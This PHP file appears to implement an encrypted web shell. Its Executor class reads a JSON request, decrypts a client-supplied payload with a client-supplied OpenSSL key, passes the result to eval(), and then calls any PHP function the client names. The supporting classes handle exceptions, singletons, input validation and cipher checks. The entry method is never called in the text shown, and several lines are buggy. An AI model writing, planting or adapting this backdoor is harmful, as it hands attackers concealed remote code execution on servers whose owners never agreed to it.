<?php

declare(strict_types=1);

function exception_handler(Throwable $exception)
{
    $currentDate = new DateTime();
    $errorObj = [
        "timestamp" => $currentDate->format('c'),
        "error" => get_class($exception),
        "message" => $exception->getMessage(),
    ];
    header('Content-Type: application/json');
    echo json_encode($errorObj);
}

set_exception_handler('exception_handler');
class MultipleExceptions extends Exception
{
    public function __construct(
        private readonly array $exceptions,
        int $code = 0,
        Throwable $previous = null
    ) {
        $message = $this->createMessage();
        parent::__construct($message, $code, $previous);
    }

    private function createMessage(string $message = "Multiple Exceptions"): string
    {
        $message = "{$message}: ";
        foreach ($this->exceptions as $exception) {
            if (!method_exists($exception, 'getMessage')) {
                $message .= "Exception does not have a message...";
                continue;
            }
            $message .=  "\"{$exception->getMessage()}\" \n";
        }
        return $message;
    }

    public function getExceptions()
    {
        return $this->exceptions;
    }
}
class UncallableFunctionException extends Exception
{
    public function __construct(
        private readonly string $uncallableFunction,
        int $code = 0,
        Throwable $previous = null
    ) {
        $message = "Function \"{$this->uncallableFunction}\" is not callable";
        parent::__construct($message, $code, $previous);
    }

    public function getUncallableFunction(): string
    {
        return $this->uncallableFunction;
    }
}

class UnavailableCipherException extends Exception
{
    public function __construct(
        private readonly string $unavailableCipher,
        int $code = 0,
        Throwable $previous = null
    ) {
        $message = "Cipher \"{$this->unavailableCipher}\" is not available";
        parent::__construct($message, $code, $previous);
    }
    public function getUnavailableCipher(): string
    {
        return $this->unavailableCipher;
    }
}

class MissingRequirementException extends Exception
{
    public function __construct(
        private readonly string $missingRequirement,
        int $code = 0,
        Throwable $previous = null
    ) {
        $message = "Requirement \"{$this->missingRequirement}\" is missing";
        parent::__construct($message, $code, $previous);
    }
    public function getUnavailableRequirement(): string
    {
        return $this->missingRequirement;
    }
}

interface Decryptor
{
    public function decrypt(string $data): string|false;
}

interface Tester
{
    /**
     * Launch all tests
     * 
     * @return void
     * @throws Exception
     */
    public function launch(): void;
}

interface DecryptorTester extends Tester
{
    public function getDecryptor(): string;
}

trait Singleton
{
    private static array $instances = [];
    private function __construct()
    {
    }
    final protected function  __clone()
    {
    }
    final public static function getInstance(...$args): self
    {
        $className = static::class;
        if (!isset(self::$instances[$className])) {
            self::$instances[$className] = new $className(...$args);
        }
        return self::$instances[$className];
    }
}

trait ClientDataValidator
{
    /**
     * @return array<string, ClassObjTyping>
     */
    abstract private function getClassObjs(): array;
    /**
     * @return void
     * @throws MissingRequirementException
     * @throws TypeError
     */
    private function validateSingle(
        string $obj,
        ClassObjTyping $classObjTyping,
        array $clientArgs
    ): void {
        if (!isset($clientArgs[$obj])) {
            if ($classObjTyping->optional == ClassObjOptional::OPTIONAL) {
                return;
            }
            throw new MissingRequirementException($obj);
        }
        $clientArgType = gettype($clientArgs[$obj]);
        $expectedType = $classObjTyping->type->value;
        if ($clientArgType != $expectedType) {
            throw new TypeError("$obj type is \"$clientArgType\", but the server expected type \"$expectedType\"");
        }
    }
    /**
     * @throws MultipleExceptions
     * @return void
     */
    final public function validate(array $clientArgs): void
    {
        $classObjs = $this->getClassObjs();
        $exceptionsArray = [];
        foreach ($classObjs as $obj => $classObjTyping) {
            try {
                $this->validateSingle($obj, $classObjTyping, $clientArgs);
            } catch (Exception $e) {
                ${$exceptionsArray}[] = $e;
            }
        }
        if ($exceptionsArray !== []) {
            throw new MultipleExceptions($exceptionsArray);
        }
    }
}

enum Typing: string
{
    case STRING = "string";
    case BOOLEAN = "boolean";
    case INTEGER = "integer";
    case DOUBLE = "double";
    case ARRAY = "array";
    case OBJECT = "object";
    case RESOURCE = "resource";
    case RESOURCE_CLOSED = "resource (closed)";
    case NULL = "NULL";
    case UNKNOWN_TYPE = "unknown type";
}

enum ClassObjOptional: string
{
    case OPTIONAL = "optional";
    case MANDATORY = "mandatory";
}

class ClassObjTyping
{
    public function __construct(public Typing $type, public ClassObjOptional $optional)
    {
    }
}

class OpensslDecryptor implements Decryptor
{
    use Singleton;
    use ClientDataValidator;
    private readonly string $cipher_algo;
    private readonly string $passphrase;
    private readonly ?string $tag;
    private int $options = 0;
    private string $iv = "";
    private string $aad = "";
    private function getClassObjs(): array
    {
        return [
            "cipher_algo" => new ClassObjTyping(Typing::STRING, ClassObjOptional::MANDATORY),
            "passphrase" => new ClassObjTyping(Typing::STRING, ClassObjOptional::MANDATORY),
            "tag" => new ClassObjTyping(Typing::STRING, ClassObjOptional::OPTIONAL),
            "options" => new ClassObjTyping(Typing::INTEGER, ClassObjOptional::OPTIONAL),
            "iv" => new ClassObjTyping(Typing::STRING, ClassObjOptional::OPTIONAL),
            "aad" =>  new ClassObjTyping(Typing::STRING, ClassObjOptional::OPTIONAL),
        ];
    }
    private function __construct(array $args)
    {
        $this->validate($args);
        $this->cipher_algo = $args["cipher_algo"];
        $this->passphrase = $args["passphrase"];
        $optArgs = ["tag", "options", "iv", "aad"];
        foreach ($optArgs as $optArg) {
            if (isset($args[$optArg])) {
                $this->$optArg = $args[$optArg];
            }
        }
    }
    final public function decrypt(string $data): string|false
    {
        return openssl_decrypt(
            $data,
            $this->cipher_algo,
            $this->passphrase,
            $this->options,
            $this->iv,
            $this->tag,
            $this->aad
        );
    }
}

class McryptDecryptor implements Decryptor
{
    use Singleton;
    private readonly string $cipher;
    private readonly string $key;
    private $mode;
    private readonly ?string $iv;
    private function __construct(array $args)
    {
        $this->cipher = $args["cipher"];
        $this->key = $args["key"];
        $this->mode = $args["mode"];
        $optArgs = ["iv"];
        foreach ($optArgs as $optArg) {
            $this->$optArg = $args[$optArg];
        }
    }
    public function decrypt(string $data): string|false
    {
        return mcrypt_decrypt(
            $this->cipher,
            $this->key,
            $data,
            $this->mode,
            $this->iv
        );
    }
}

class TestPhpOpenssl implements DecryptorTester
{
    use Singleton;
    private array $opensslFunctions = [
        "openssl_decrypt",
        "openssl_get_cipher_methods"
    ];
    private string $wantedOpenSslCipher = "aes-256-gcm";
    private function __construct()
    {
    }

    final public function testOpensslFunctions(): ?array
    {
        $uncallableFunctions = [];
        $callableFunctions = [];
        foreach ($this->opensslFunctions as $funcName) {
            if (!is_callable($funcName)) {
                $uncallableFunctions[] = new UncallableFunctionException($funcName);
            }
            $callableFunctions[] = $funcName;
        }
        if ($uncallableFunctions !== []) {
            throw new MultipleExceptions($uncallableFunctions);
        }
        return $callableFunctions;
    }
    final public function testOpensslCipher(): ?string
    {
        $ciphers = openssl_get_cipher_methods();
        if (in_array($this->wantedOpenSslCipher, $ciphers)) {
            return $this->wantedOpenSslCipher;
        }
        throw new UnavailableCipherException($this->wantedOpenSslCipher);
    }

    public function launch(): void
    {
        $exceptionArray = [];
        $functions = [
            fn (): ?array => $this->testOpensslFunctions(),
            fn (): ?string => $this->testOpensslCipher()
        ];
        foreach ($functions as $func) {
            try {
                $func();
            } catch (Exception $e) {
                $exceptionArray[] = $e;
            }
        }
        if ($exceptionArray !== []) {
            throw new MultipleExceptions($exceptionArray);
        }
    }
    public function getDecryptor(): string
    {
        return OpensslDecryptor::class;
    }
}


class GetPHP
{
    use Singleton;

    /**
     * @var array<DecryptorTester> $decryptorTesters
     */
    private array $decryptorTesters = [];
    private function __construct()
    {
        $this->decryptorTesters[] = TestPhpOpenssl::getInstance();
    }
    public function getDecryptor(): string
    {
        $exceptions = [];
        foreach ($this->decryptorTesters as $tester) {
            try {
                $tester->launch();
                return $tester->getDecryptor();
            } catch (Exception $e) {
                $exceptions[] = $e;
            }
        }
        if ($exceptions !== []) {
            throw new MultipleExceptions($exceptions);
        }
        throw new MissingRequirementException("There's no decryptor!");
    }
}

class Executor
{
    use Singleton;
    use ClientDataValidator;
    private readonly Decryptor $decryptor;
    private readonly array $decryptorData;
    private ?string $command = null;
    private ?array $parameters = null;
    private function getClassObjs(): array
    {
        return [
            "decryptor" => new ClassObjTyping(Typing::OBJECT, ClassObjOptional::MANDATORY),
            "command" => new ClassObjTyping(Typing::STRING, ClassObjOptional::OPTIONAL),
            "parameters" => new ClassObjTyping(Typing::OBJECT, ClassObjOptional::OPTIONAL),
        ];
    }
    private function __construct()
    {
        $rawClientData = file_get_contents('php://input');
        $clientData = json_decode(
            json: $rawClientData,
            associative: true,
            flags: JSON_THROW_ON_ERROR
        );
        $this->validate($clientData);
        $this->decryptorData = $clientData["decryptor"];
        if (isset($clientData["command"])) {
            $this->command = $clientData["command"];
        }
        if (isset($clientData["parameters"])) {
            $this->parameters = $clientData["parameters"];
        }
        $decryptorPtr = GetPHP::getInstance()->getDecryptor();
        $this->decryptor = $decryptorPtr::getInstance($this->decryptorData);
    }
    private function exec(string $encryptedPhpString): mixed
    {
        $phpString = $this->decryptor->decrypt($encryptedPhpString);
        $evalReturn = eval($phpString);
        if (!$this->command) {
            return $evalReturn;
        }
        if (!function_exists($this->command)) {
            throw new Exception("function {$this->command} does not exist");
        }
        return call_user_func($this->command, $this->parameters);
    }
}
